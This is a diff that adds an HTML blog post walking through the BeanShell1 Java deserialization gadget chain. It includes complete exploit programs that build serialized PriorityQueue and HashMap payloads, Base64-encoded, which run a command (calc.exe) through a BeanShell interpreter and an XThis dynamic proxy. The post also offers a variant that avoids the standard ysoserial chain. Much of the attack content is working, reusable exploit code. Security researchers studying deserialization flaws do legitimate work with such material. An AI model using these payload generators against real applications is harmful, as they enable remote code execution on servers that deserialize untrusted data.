@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BeanShell1 | zdaylabs</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #1a1f2e 0%, #2d3748 50%, #1e3a5f 100%);
+      color: #dcdcdc;
+      line-height: 1.6;
+      padding: 0 2rem;
+      min-height: 100vh;
+    }
+    
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 2rem 0 1rem;
+      border-bottom: 1px solid #333;
+    }
+    
+    .logo {
+      font-size: 1.5rem;
+      font-weight: bold;
+      color: #ffffff;
+    }
+    
+    nav a {
+      margin: 0 1rem;
+      text-decoration: none;
+      color: #ccc;
+      font-size: 0.95rem;
+    }
+    
+    nav a:hover {
+      color: #fef200;
+    }
+    
+    .socials a {
+      margin-left: 1rem;
+      color: #999;
+      font-size: 1.2rem;
+      text-decoration: none;
+    }
+    
+    main {
+      max-width: 1000px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+    }
+    
+    h1 {
+      font-size: 2.5rem;
+      color: #fff;
+      margin-bottom: 1rem;
+    }
+    
+    h2 {
+      color: #fef200;
+      font-size: 1.8rem;
+      margin: 2rem 0 1rem;
+      border-bottom: 2px solid #333;
+      padding-bottom: 0.5rem;
+    }
+    
+    h3 {
+      color: #fef200;
+      font-size: 1.4rem;
+      margin: 1.5rem 0 0.8rem;
+    }
+    
+    h4 {
+      color: #fef200;
+    }
+    
+    .highlight {
+      color: #fef200;
+      font-weight: 600;
+    }
+    
+    .accent {
+      color: #36d1dc;
+    }
+    
+    p {
+      color: #bbb;
+      margin-bottom: 1rem;
+    }
+    
+    pre {
+      background-color: #1e2329;
+      border: 1px solid #333;
+      border-radius: 4px;
+      padding: 1rem;
+      overflow-x: auto;
+      margin: 1rem 0;
+    }
+    
+    code {
+      color: #36d1dc;
+      font-family: 'Courier New', monospace;
+    }
+    
+    a {
+      color: #36d1dc;
+      text-decoration: none;
+    }
+    
+    a:hover {
+      color: #fef200;
+    }
+    
+    ul, ol {
+      color: #bbb;
+    }
+    
+    li {
+      margin-bottom: 0.5rem;
+    }
+    
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 4px;
+      margin: 1rem 0;
+    }
+  </style>
+</head>
+<body>
+  <div id="navigation-placeholder"></div>
+  <script src="navigation.js"></script>
+
+  <main>
+    <h1>BeanShell1</h1>
+<p>In this blog post we will talk about the BeanShell1 gadget chain and how we can build it without the ysoserial tool.</p>
+
+<p>This chain is somewhat similar to the CommonsCollection2 chain.</p>
+<p>As we know, in the CommonsCollection2 chain we use PriorityQueue and Transforming Comparator to reach Runtime.getRuntime().exec().</p>
+<div style="background-color: #1e1f22; color: #bcbec4;">
+  <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt; margin: 0;">
+<code>PriorityQueue.<span style="color: #56a8f5;">readObject</span>()
+   PriorityQueue.<span style="color: #56a8f5;">heapify</span>()
+     PriorityQueue.<span style="color: #56a8f5;">shiftdownOperator</span>()
+       Comparator.<span style="color: #56a8f5;">compare</span>()
+          TransformingComparator.<span style="color: #56a8f5;">compare</span>()
+                InvokerTransformer.<span style="color: #56a8f5;">transform</span>()
+                    TemplatesImpl.<span style="color: #56a8f5;">newTransform</span>()
+                        Loads our byteCode and executes it which indeed calls
+                            Runtime.<span style="color: #56a8f5;">getRuntime</span>().<span style="color: #56a8f5;">exec</span>(cmd)</code>
+  </pre>
+</div>            
+<p>In this gadget, we will use the PriorityQueue but instead of Transforming Comparator, we will use something else.</p>
+<p>So if you have not read the CommonsCollection2 blog, it's a good time to go through it.</p>
+<p>Now let's jump into this gadget.</p>
+
+
+<div style="background-color: #1e1f22; color: #bcbec4;">
+<pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.InvocationHandler;
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.Proxy;
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.Field;
+<span style="color: #cf8e6d;">import</span> java.util.Comparator;
+<span style="color: #cf8e6d;">import</span> java.util.PriorityQueue;
+<span style="color: #cf8e6d;">import</span> java.util.Base64;
+<span style="color: #cf8e6d;">import</span> java.io.ByteArrayOutputStream;
+<span style="color: #cf8e6d;">import</span> java.io.ObjectOutputStream;
+
+<span style="color: #cf8e6d;">import</span> bsh.Interpreter;
+<span style="color: #cf8e6d;">import</span> bsh.XThis;
+
+<span style="color: #cf8e6d;">class</span> <span style="color: #56a8f5;">Exploit</span> {
+
+    <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(String[] args) {
+        <span style="color: #cf8e6d;">try</span> {
+
+<span style="color: #7a7e85;">//Registering the Compare Method as per Comparator.compare() signature</span>
+            String payload =
+                <span style="color: #6aab73;">"compare(Object foo, Object bar) {"</span> +
+                <span style="color: #6aab73;">"    new java.lang.ProcessBuilder(new String[]{\"calc.exe\"}).start();"</span> +
+                <span style="color: #6aab73;">"    return new Integer(1);"</span> +
+                <span style="color: #6aab73;">"}"</span>;
+
+            Interpreter interpreter = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">Interpreter</span>();
+            interpreter.<span style="color: #56a8f5;">eval</span>(payload);
+
+
+<span style="color: #7a7e85;">//Creating XThis Object , so that we can use reflection to access the Handler() which have an Invoke()</span>
+
+            XThis xThis = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">XThis</span>(interpreter.<span style="color: #56a8f5;">getNameSpace</span>(), interpreter);
+
+            Field invocationHandlerField = XThis.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"invocationHandler"</span>);
+            invocationHandlerField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
+            InvocationHandler handler = (InvocationHandler) invocationHandlerField.<span style="color: #56a8f5;">get</span>(xThis);
+
+            <span style="color: #7a7e85;">// Step 3: Create a dynamic proxy implementing Comparator</span>
+            Comparator&lt;?&gt; comparator = (Comparator&lt;?&gt;) Proxy.<span style="color: #56a8f5;">newProxyInstance</span>(
+                Comparator.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getClassLoader</span>(),
+                <span style="color: #cf8e6d;">new</span> Class&lt;?&gt;[]{ Comparator.<span style="color: #cf8e6d;">class</span> },
+                handler
+            );
+
+            <span style="color: #7a7e85;">//Creating PriorityQueue which will call the Comparator.compare()</span>
+            PriorityQueue&lt;Object&gt; priorityQueue = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">PriorityQueue</span>&lt;&gt;(<span style="color: #2aacb8;">2</span>, (Comparator&lt;Object&gt;) comparator);
+            priorityQueue.<span style="color: #56a8f5;">add</span>(<span style="color: #2aacb8;">1</span>);
+            priorityQueue.<span style="color: #56a8f5;">add</span>(<span style="color: #2aacb8;">2</span>);
+<span style="color: #7a7e85;">/*Forget the below For now
+            Field queueField = PriorityQueue.class.getDeclaredField("queue");
+            queueField.setAccessible(true);
+            queueField.set(priorityQueue, new Object[]{ 11, 11 });
+
+            Field sizeField = PriorityQueue.class.getDeclaredField("size");
+            sizeField.setAccessible(true);
+            sizeField.set(priorityQueue, 2);
+
+            // Step 5: Serialize the PriorityQueue
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(bos);
+            oos.writeObject(priorityQueue);
+            oos.close();
+
+            // Step 6: Base64 encode and print
+            String encoded = Base64.getEncoder().encodeToString(bos.toByteArray());
+            System.out.println(encoded);
+*/</span>
+        } <span style="color: #cf8e6d;">catch</span> (Exception e) {
+            e.<span style="color: #56a8f5;">printStackTrace</span>();
+        }
+    }
+}</pre></div>
+
+
+<p>The above code will pop a calculator.</p><p>Before we dive in, let's understand Dynamic Proxy.</p>
+<p>It is a Proxy mechanism in Java in which you can call any method present on a class.</p>
+<p>So for example,</p>
+<p>If you want to call the display method in the below class</p>
+
+<div style="background-color: #1e1f22; color: #bcbec4;">
+<pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+  <span style="color: #cf8e6d;">public class</span> <span style="color: #56a8f5;">Sample</span> <span style="color: #cf8e6d;">implements</span> Displayable {
+
+    <span style="color: #cf8e6d;">@Override</span>
+    <span style="color: #cf8e6d;">public void</span> <span style="color: #56a8f5;">display</span>() {
+        System.<span style="color: #cf8e6d;">out</span>.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"display method is called"</span>);
+    }
+
+    <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(String[] args) {
+        Sample s = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">Sample</span>();
+        s.<span style="color: #56a8f5;">display</span>();
+    }
+}</pre></div>
+
+<p>and there exists another interface called Displayable</p>
+
+
+<div style="background-color: #1e1f22; color: #bcbec4;">
+  <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+    <span style="color: #cf8e6d;">public interface</span> <span style="color: #56a8f5;">Displayable</span> {
+    <span style="color: #cf8e6d;">void</span> <span style="color: #56a8f5;">display</span>();
+}</pre></div>
+
+<p>you can use Dynamic Proxy to do so.</p>
+
+<p>However, in order to do so, there has to be another class that would implement an InvocationHandler and a method called invoke(), and that invoke() should contain the logic to call this display method.</p>
+<p>So let's say there is a class called AnotherClass which looks like below</p>
+
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.InvocationHandler;
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.Method;
+
+<span style="color: #cf8e6d;">public class</span> <span style="color: #56a8f5;">AnotherClass</span> <span style="color: #cf8e6d;">implements</span> InvocationHandler {
+
+    <span style="color: #cf8e6d;">private final</span> Object target;
+
+    <span style="color: #cf8e6d;">public</span> <span style="color: #56a8f5;">AnotherClass</span>(Object target) {
+        <span style="color: #cf8e6d;">this</span>.target = target;
+    }
+
+    <span style="color: #cf8e6d;">@Override</span>
+    <span style="color: #cf8e6d;">public</span> Object <span style="color: #56a8f5;">invoke</span>(Object proxy, Method method, Object[] args) <span style="color: #cf8e6d;">throws</span> Throwable {
+        <span style="color: #7a7e85;"></span>
+        System.<span style="color: #cf8e6d;">out</span>.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"Dangerous Function Getting called"</span>);
+        <span style="color: #cf8e6d;">if</span> (<span style="color: #6aab73;">"display"</span>.<span style="color: #56a8f5;">equals</span>(method.<span style="color: #56a8f5;">getName</span>()) &amp;&amp; method.<span style="color: #56a8f5;">getParameterCount</span>() == <span style="color: #2aacb8;">0</span>) {
+            Method m = target.<span style="color: #56a8f5;">getClass</span>().<span style="color: #56a8f5;">getMethod</span>(<span style="color: #6aab73;">"display"</span>);
+            <span style="color: #cf8e6d;">return</span> m.<span style="color: #56a8f5;">invoke</span>(target);
+        }
+
+        <span style="color: #7a7e85;"></span>
+        <span style="color: #cf8e6d;">return</span> method.<span style="color: #56a8f5;">invoke</span>(target, args);
+    }
+}</pre></div>
+<p>Now we can call this using the below code</p>
+
+
+<div style="background-color: #1e1f22; color: #bcbec4;">
+  
+  <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.Proxy;
+
+<span style="color: #cf8e6d;">public class</span> <span style="color: #56a8f5;">Demo</span> {
+
+    <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(String[] args) {
+        Sample real = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">Sample</span>();
+
+    InvocationHandler handler = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">AnotherClass</span>(real);
+        Displayable proxy = (Displayable) Proxy.<span style="color: #56a8f5;">newProxyInstance</span>(
+            Displayable.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getClassLoader</span>(),
+            <span style="color: #cf8e6d;">new</span> Class&lt;?&gt;[]{ Displayable.<span style="color: #cf8e6d;">class</span> },
+            handler
+        );
+
+        proxy.<span style="color: #56a8f5;">display</span>();
+    }
+}</pre></div>
+
+<p>Note: Proxy.newProxyInstance() works only on interfaces and not on concrete classes.</p><p>As you can see, using the Displayable interface and AnotherClass as a handler, we are able to call the display method.</p>
+<p>One thing to note here is that even though we have successfully called the display() from the Sample class, the invoke method present on AnotherClass also gets executed.</p>
+<p>So if the invoke function present on AnotherClass does any dangerous operation, that will also get called.</p><p>Now let's take a look into the gadget.</p>
+<img src="images/Beanshell1/dynamicProxyExample.png">
+<p>We are using the XThis object as an InvocationHandler.</p>
+
+<p>If you take a look into the XThis class,</p>
+
+<img src="images/Beanshell1//HandleClass.png" style="max-width:100%; height:auto; border-radius:4px; margin:1rem 0;">
+
+<p>But why do we need to do this?</p>
+<p>Let's take a dive into the invoke() here.</p><p>The invoke() calls InvokeImpl.</p>
+
+<img src="images/Beanshell1/InvokeImpl.png" style="max-width:100%; height:auto; border-radius:4px; margin:1rem 0;">
+
+<p>The above code checks various things — if the method name equals toString(), it does some operation, but we are not interested in this.</p>
+<p>At the end it calls InvokeMethod().</p>
+
+<p>This method is present on its super class, that is <a type="inline-richlink" rev="{&quot;isCached&quot;:false}" href="https://This.java">This.java</a></p>
+
+<img src="images/Beanshell1/InvokeMethodThisClass.png" style="max-width:100%; height:auto; border-radius:4px; margin:1rem 0;">
+
+<p>At the tail of the class we get the bshMethod name from namespace.getMethod and if it is not null we call bshMethod.invoke().</p>
+<p>This method further does some checks and the code finally traverses to invokeImpl().</p><p>And methodBody.eval() gets called.</p>
+
+<img src="images/Beanshell1/MethodBodyeval.png" style="max-width:100%; height:auto; border-radius:4px; margin:1rem 0;">
+
+<p>This is the function which parses our AST and executes our code.</p>
+<p>So in short, if we can reach the invoke() present on <a type="inline-richlink" rev="{&quot;isCached&quot;:false}" href="https://XThis.java">XThis.java</a> 
+  we can reach methodBody.eval and get our code executed.</p><p>Now let's understand how we can reach here.</p>
+  <p>On XThis class at the beginning</p>
+  
+  <img src="images/Beanshell1/InvocationHander.png" style="max-width:100%; height:auto; border-radius:4px; margin:1rem 0;">
+  
+  <p>Which means if we create a Dynamic Proxy with the Handler() object as the handler, we can reach the invoke() and get our code executed.</p>
+  <p>As you can see, the InvocationHandler object, which is an object of Handler(), is a transient type, which means it cannot be directly serialized.</p>
+  <p>So we are using Reflection to set the field accessible and then getting the Handler object and assigning it as a handler so that we can use it with the Dynamic Proxy.</p>
+  <p>Now once we set the Dynamic Proxy, we need a class which will call any method via this Dynamic Proxy. We are not bound to use PriorityQueue here and can use any class that has a custom readObject call and calls certain methods inside it on the object passed by us.</p>
+  <p>We will see that in our extra miles, but for now let's stick to PriorityQueue.</p>
+  <p>So in PriorityQueue, we have a readObject call which indeed calls the compare() on the object we pass, which means if we pass the Dynamic Proxy as a comparator to the PriorityQueue, the PriorityQueue is going to call compare() on the Dynamic Proxy, but the Dynamic Proxy will call the compare method via the Invoke method of the Handler class, and as we saw, once we reach the Handler class through our AST syntax, we can achieve code execution.</p>
+  <p>Now let's head back to stage 1 again to understand how we are propagating our AST symbols to the invoke method.</p><p>So in BeanShell, we have a constructor that takes 2 things,</p>
+  <p>1. Namespace</p><p>2. An interpreter</p><p>The interpreter has an eval() which will simply register our AST expression, and once we use that XThis constructor, the interpreter and the namespace get set.</p>
+  <p>Let's see a small example:</p>
+  
+<div style="background-color: #1e1f22; color: #bcbec4;">
+    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+<span style="color: #cf8e6d;">import</span> bsh.Interpreter;
+
+<span style="color: #cf8e6d;">public class</span> <span style="color: #56a8f5;">test</span> {
+
+    <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(String[] args) <span style="color: #cf8e6d;">throws</span> Exception {
+        Interpreter interpreter = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">Interpreter</span>();
+
+        <span style="color: #7a7e85;">// Rule loaded from a config file or database at runtime</span>
+        String rule =
+            <span style="color: #6aab73;">"void evaluate() {"</span> +
+            <span style="color: #6aab73;">"    System.out.println(\"GETTING EXECUTED\");"</span> +
+            <span style="color: #6aab73;">"}"</span>;
+
+        interpreter.<span style="color: #56a8f5;">eval</span>(rule);
+
+        interpreter.<span style="color: #56a8f5;">eval</span>(<span style="color: #6aab73;">"evaluate()"</span>);
+
+    }
+}</pre></div>
+
+<img src="images/Beanshell1/image.png" style="max-width:100%; height:auto; border-radius:4px; margin:1rem 0;">
+
+<p>You may ask, why on the first eval the code did not get executed, but on the 2nd eval it did get executed.</p>
+
+<p>This interpreter is the same as Java.</p><p>So in a Java file, just because you define a function doesn't mean it will get executed, but if you call it, it will get executed.</p>
+
+<p>Similarly, on the first eval, the function is getting defined, and on the 2nd eval we are calling it.</p>
+<p>Now if you check our payload, we are doing something similar — at first we are simply defining what the compare function would be, and when the PriorityQueue gets deserialized, shiftdownOperator calls the compare() function.</p>
+<p>This will flow to our InvocationHandler which will call the Invoke() &rarr; InvokeImpl() &rarr; InvokeMethod &rarr; InvokeImpl &rarr; methodBody.eval().</p>
+
+<p>And this is where the compare function flows and since we have declared our function, when compare() is called, our compare gets called and we achieve code execution.</p>
+<p>So the below code can be used to get a Base64 string of the gadget chain.</p>
+<div style="background-color: #1e1f22; color: #bcbec4;">
+  <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.InvocationHandler;
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.Proxy;
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.Field;
+<span style="color: #cf8e6d;">import</span> java.util.Comparator;
+<span style="color: #cf8e6d;">import</span> java.util.PriorityQueue;
+<span style="color: #cf8e6d;">import</span> java.util.Base64;
+<span style="color: #cf8e6d;">import</span> java.io.ByteArrayOutputStream;
+<span style="color: #cf8e6d;">import</span> java.io.ObjectOutputStream;
+
+<span style="color: #cf8e6d;">import</span> bsh.Interpreter;
+<span style="color: #cf8e6d;">import</span> bsh.XThis;
+
+<span style="color: #cf8e6d;">class</span> <span style="color: #56a8f5;">Exploit</span> {
+
+    <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(String[] args) {
+        <span style="color: #cf8e6d;">try</span> {
+
+<span style="color: #7a7e85;">//Registering the Compare Method as per Comparator.compare() signature</span>
+            String payload =
+                <span style="color: #6aab73;">"compare(Object foo, Object bar) {"</span> +
+                <span style="color: #6aab73;">"    new java.lang.ProcessBuilder(new String[]{\"calc.exe\"}).start();"</span> +
+                <span style="color: #6aab73;">"    return new Integer(1);"</span> +
+                <span style="color: #6aab73;">"}"</span>;
+
+            Interpreter interpreter = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">Interpreter</span>();
+            interpreter.<span style="color: #56a8f5;">eval</span>(payload);
+
+
+<span style="color: #7a7e85;">//Creating XThis Object , so that we can use reflection to access the Handler() which have an Invoke()</span>
+
+            XThis xThis = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">XThis</span>(interpreter.<span style="color: #56a8f5;">getNameSpace</span>(), interpreter);
+
+            Field invocationHandlerField = XThis.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"invocationHandler"</span>);
+            invocationHandlerField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
+            InvocationHandler handler = (InvocationHandler) invocationHandlerField.<span style="color: #56a8f5;">get</span>(xThis);
+
+            <span style="color: #7a7e85;">// Step 3: Create a dynamic proxy implementing Comparator</span>
+            Comparator&lt;?&gt; comparator = (Comparator&lt;?&gt;) Proxy.<span style="color: #56a8f5;">newProxyInstance</span>(
+                Comparator.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getClassLoader</span>(),
+                <span style="color: #cf8e6d;">new</span> Class&lt;?&gt;[]{ Comparator.<span style="color: #cf8e6d;">class</span> },
+                handler
+            );
+
+            <span style="color: #7a7e85;">//Creating PriorityQueue which will call the Comparator.compare()</span>
+            PriorityQueue&lt;Object&gt; priorityQueue = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">PriorityQueue</span>&lt;&gt;(<span style="color: #2aacb8;">2</span>, (Comparator&lt;Object&gt;) comparator);
+            Field queueField = PriorityQueue.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"queue"</span>);
+            queueField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
+            queueField.<span style="color: #56a8f5;">set</span>(priorityQueue, <span style="color: #cf8e6d;">new</span> Object[]{ <span style="color: #2aacb8;">11</span>, <span style="color: #2aacb8;">11</span> });
+
+            Field sizeField = PriorityQueue.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"size"</span>);
+            sizeField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
+            sizeField.<span style="color: #56a8f5;">set</span>(priorityQueue, <span style="color: #2aacb8;">2</span>);
+
+            <span style="color: #7a7e85;">// Step 5: Serialize the PriorityQueue</span>
+            ByteArrayOutputStream bos = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">ByteArrayOutputStream</span>();
+            ObjectOutputStream oos = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">ObjectOutputStream</span>(bos);
+            oos.<span style="color: #56a8f5;">writeObject</span>(priorityQueue);
+            oos.<span style="color: #56a8f5;">close</span>();
+
+            <span style="color: #7a7e85;">// Step 6: Base64 encode and print</span>
+            String encoded = Base64.<span style="color: #56a8f5;">getEncoder</span>().<span style="color: #56a8f5;">encodeToString</span>(bos.<span style="color: #56a8f5;">toByteArray</span>());
+            System.<span style="color: #cf8e6d;">out</span>.<span style="color: #56a8f5;">println</span>(encoded);
+
+        } <span style="color: #cf8e6d;">catch</span> (Exception e) {
+            e.<span style="color: #56a8f5;">printStackTrace</span>();
+        }
+    }
+}</pre></div>
+
+
+<h2>Extra Miles:</h2><p>So as we discussed, we are not bound to use the PriorityQueue.</p><p>So let's use the HashMap.</p>
+<div style="background-color: #1e1f22; color: #bcbec4;">
+  <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.InvocationHandler;
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.Proxy;
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.Field;
+<span style="color: #cf8e6d;">import</span> java.util.Base64;
+<span style="color: #cf8e6d;">import</span> java.util.Comparator;
+<span style="color: #cf8e6d;">import</span> java.util.HashMap;
+<span style="color: #cf8e6d;">import</span> java.io.ByteArrayOutputStream;
+<span style="color: #cf8e6d;">import</span> java.io.ObjectOutputStream;
+
+<span style="color: #cf8e6d;">import</span> bsh.Interpreter;
+<span style="color: #cf8e6d;">import</span> bsh.XThis;
+
+<span style="color: #cf8e6d;">class</span> <span style="color: #56a8f5;">exploit</span> {
+
+    <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(String[] args) {
+        <span style="color: #cf8e6d;">try</span> {
+            <span style="color: #7a7e85;"></span>
+String payload = <span style="color: #6aab73;">"int hashCode() {"</span> +
+    <span style="color: #6aab73;">"new java.lang.ProcessBuilder(new String[]{\"calc.exe\"}).start();"</span> +
+    <span style="color: #6aab73;">"return 1;}"</span>;
+
+            <span style="color: #7a7e85;">// Creating BeanShell interpreter and evaluating the payload</span>
+            Interpreter interpreter = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">Interpreter</span>();
+            interpreter.<span style="color: #56a8f5;">eval</span>(payload);
+
+            <span style="color: #7a7e85;">// InvocationHander Extraction using Refelction</span>
+            XThis xThis = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">XThis</span>(interpreter.<span style="color: #56a8f5;">getNameSpace</span>(), interpreter);
+
+            Field invocationHandlerField = XThis.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"invocationHandler"</span>);
+            invocationHandlerField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
+            InvocationHandler handler = (InvocationHandler) invocationHandlerField.<span style="color: #56a8f5;">get</span>(xThis);
+
+            <span style="color: #7a7e85;">// Creating Dynamic Proxy which will be used in the HashMap Key</span>
+            Object key = Proxy.<span style="color: #56a8f5;">newProxyInstance</span>(
+                HashMap.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getClassLoader</span>(),
+                <span style="color: #cf8e6d;">new</span> Class&lt;?&gt;[]{ Comparator.<span style="color: #cf8e6d;">class</span> },
+                handler
+            );
+
+            <span style="color: #7a7e85;">// Insert the proxy key into the HashMap (triggers hashCode on deserialization)</span>
+            HashMap&lt;Object, String&gt; hashMap = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">HashMap</span>&lt;&gt;();
+            hashMap.<span style="color: #56a8f5;">put</span>(key, <span style="color: #6aab73;">"test"</span>);
+
+            <span style="color: #7a7e85;"></span>
+            ByteArrayOutputStream bos = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">ByteArrayOutputStream</span>();
+            ObjectOutputStream oos = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">ObjectOutputStream</span>(bos);
+            oos.<span style="color: #56a8f5;">writeObject</span>(hashMap);
+            oos.<span style="color: #56a8f5;">close</span>();
+
+            <span style="color: #7a7e85;"></span>
+            String encoded = Base64.<span style="color: #56a8f5;">getEncoder</span>().<span style="color: #56a8f5;">encodeToString</span>(bos.<span style="color: #56a8f5;">toByteArray</span>());
+            System.<span style="color: #cf8e6d;">out</span>.<span style="color: #56a8f5;">println</span>(encoded);
+
+        } <span style="color: #cf8e6d;">catch</span> (Exception e) {
+            e.<span style="color: #56a8f5;">printStackTrace</span>();
+        }
+    }
+}</pre></div>
+
+<p>In the above code, we have changed our AST signature and the dynamic proxy.</p>
+<p>When we deserialize the HashMap class, the readObject() present on the HashMap eventually flows to the hashCode function of the key.</p>
+<p>So we have created the AST symbol that matches the signature of hashCode() and we have changed our Dynamic Proxy to use HashMap.class with the invocationHandler being the same.</p>
+<p>If you pay close attention, the interface used on the dynamic proxy is Comparator.class instead of HashMap.class or any other interface that defines hashCode. In fact, it does not matter which interface you set here.</p>
+<p>And the reason is simple.</p>
+<p>So in a Dynamic Proxy, the interface tells Java what the Proxy is pretending to be.</p>
+<p>So if there are no checks on the class it's pretending to be, then we can set any random interface (it does not need to be serializable).</p>
+<p>In the case of PriorityQueue, the class needs a Comparator — anything else will fail.</p>
+<p>But in the case of HashMap and hashCode, there are no such checks, and in fact the key itself is of Object type.</p>
+<P>So this is how the BeanShell1 Gadget works and how we can improvise it.</P>
+<p>Hope you like it.</p>
+<br><br>
+<p>That's it for today.</p>
+<p>Thanks for reading.</p>
+<p>Happy Hacking.</p>
+
+<p>You can connect with me at:</p>
+<p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
+<p><a href="https://x.com/webspl01t3r">Twitter</a></p>
+</main>
+</body>
+</html>
